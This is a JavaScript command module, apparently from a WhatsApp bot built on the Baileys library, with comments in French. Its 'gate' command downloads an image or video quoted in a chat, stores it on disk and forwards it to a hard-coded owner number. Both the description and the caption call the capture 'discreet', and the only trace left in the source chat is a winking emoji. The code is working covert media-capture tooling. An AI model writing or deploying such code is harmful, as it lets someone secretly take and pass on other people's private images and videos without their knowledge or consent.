const fs = require("fs");

const path = require("path");

const { downloadContentFromMessage } = require("@whiskeysockets/baileys");

// 🔐 TON NUMÉRO WHATSAPP OWNER (CONFIRMÉ)

const OWNER_JID = "243816107573@s.whatsapp.net";

module.exports = {

  name: "gate",

  description: "Sauvegarde discrètement image ou vidéo et l’envoie à l’owner",

  async execute(sock, msg) {

    try {

      const from = msg.key.remoteJid;

      // 🔁 message cité

      const quoted =

        msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;

      if (!quoted) return;

      let mediaType;

      let mediaMsg;

      let extension;

      // 📸 IMAGE

      if (quoted.imageMessage) {

        mediaType = "image";

        mediaMsg = quoted.imageMessage;

        extension = "jpg";

      }

      // 🎥 VIDÉO

      else if (quoted.videoMessage) {

        mediaType = "video";

        mediaMsg = quoted.videoMessage;

        extension = "mp4";

      } else {

        return;

      }

      // 📁 dossier

      const saveDir = path.join(__dirname, "../saved_media", mediaType);

      if (!fs.existsSync(saveDir)) {

        fs.mkdirSync(saveDir, { recursive: true });

      }

      // ⬇️ téléchargement média

      const stream = await downloadContentFromMessage(mediaMsg, mediaType);

      let buffer = Buffer.from([]);

      for await (const chunk of stream) {

        buffer = Buffer.concat([buffer, chunk]);

      }

      const fileName = `${mediaType}_${Date.now()}.${extension}`;

      const filePath = path.join(saveDir, fileName);

      fs.writeFileSync(filePath, buffer);

      // 📩 ENVOI PRIVÉ À L’OWNER

      await sock.sendMessage(OWNER_JID, {

        [mediaType]: buffer,

        caption:

          `🕵️ ${mediaType === "image" ? "Image" : "Vidéo"} capturée discrètement\n\n| powered by HEXTECH`

      });

      // 😏 réaction discrète dans le chat source

      await sock.sendMessage(from, {

        react: { text: "😉", key: msg.key }

      });

    } catch (err) {

      console.error("❌ Erreur gate :", err);

    }

  }

};